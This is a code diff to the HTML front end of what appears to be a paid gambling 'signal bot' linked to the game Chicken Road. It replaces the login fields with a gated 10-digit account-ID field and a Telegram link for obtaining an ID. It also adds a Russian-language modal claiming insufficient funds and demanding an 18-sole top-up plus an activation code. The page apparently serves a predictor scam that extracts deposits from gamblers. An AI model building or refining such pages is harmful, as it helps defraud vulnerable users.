@@ -32,12 +32,14 @@
       <section class="auth-card">
         <h2>SIGN IN</h2>
         <form id="gate-form" class="auth-form">
-          <input id="login" class="auth-input" placeholder="Login" autocomplete="username" />
-          <input id="password" type="password" class="auth-input" placeholder="Password" autocomplete="current-password" />
-          <button class="btn btn-primary" type="submit">SIGN IN</button>
-          <a id="get-data" class="btn btn-secondary" href="https://t.me/ChickenRoad2_support" target="_blank" rel="noopener">GET DATA</a>
-          <a class="btn btn-buy" href="https://t.me/send?start=IVspjZEXURE9" target="_blank" rel="noopener">BUY ACCESS</a>
-          <div id="gate-error" class="auth-error" hidden>Invalid login or password</div>
+          <!-- заменил логин и пароль на одно поле ID -->
+          <input id="account-id" class="auth-input" placeholder="Введите ID аккаунта (10 цифр, начиная с 138+)" maxlength="10" />
+          <!-- заменил кнопки на "Продолжить" и "Получить ID" -->
+          <div class="lalka01">
+            <button class="btn btn-primary" type="submit">Продолжить</button>
+            <a id="get-id-btn" class="btn btn-secondary" href="https://t.me/RamirezSignal_bot?text=Я хочу получить ID" target="_blank" rel="noopener">Получить ID</a>
+          </div>
+          <div id="gate-error" class="auth-error" hidden>Неверный ID. ID должен состоять из 10 цифр и начинаться с 138 или выше</div>
         </form>
       </section>
 
@@ -93,7 +95,18 @@
     </div>
   </div>
 
+  <!-- добавил модальное окно для пополнения счета -->
+  <div id="payment-modal" class="modal hidden">
+    <div class="modal-card payment-card">
+      <h3>Пополнение счета</h3>
+      <p>На вашем аккаунте недостаточно средств.</p>
+      <p>Необходимо пополнить на <strong>18 soles</strong></p>
+      <p>Для активации бота введите код: <strong>6023</strong></p>
+      <input id="activation-code" class="auth-input" placeholder="Введите код активации" maxlength="4" />
+      <button id="activate-btn" class="btn btn-primary">Активировать</button>
+    </div>
+  </div>
+
   <script src="script.js"></script>
 </body>
 </html>
- 
